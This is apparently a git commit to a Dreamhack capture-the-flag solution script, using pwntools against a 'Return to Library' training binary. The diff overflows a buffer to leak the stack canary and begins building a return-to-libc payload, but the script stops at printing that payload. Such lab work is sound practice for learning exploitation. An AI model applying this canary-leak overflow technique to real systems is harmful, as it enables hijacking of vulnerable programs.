cc599acb1be85cc84d3018a18be04257ea3ef012
Brian Lee <hibrian827@gmail.com>
2024-07-25 00:30:48 +0900

    still solving

--- Dreamhack/main.py
+++ Dreamhack/main.py
@@ -4,5 +4,11 @@ from pwn import *
 # rem = remote("srv1.kitriwhs.kr", port)
 rem = process('./Return to Library/rtl')
 
-rem.sendafter(b'Buf: ', b'A' * 0x31)
-print(rem.recvline())
+payload = b'A' * 0x39
+rem.sendafter(b'Buf: ', payload)
+rem.recvuntil(payload)
+canary = u64(b'\x00' + rem.recvn(7))
+
+payload += p64(canary)
+payload += b'\x00' * 0x8
+print(payload)
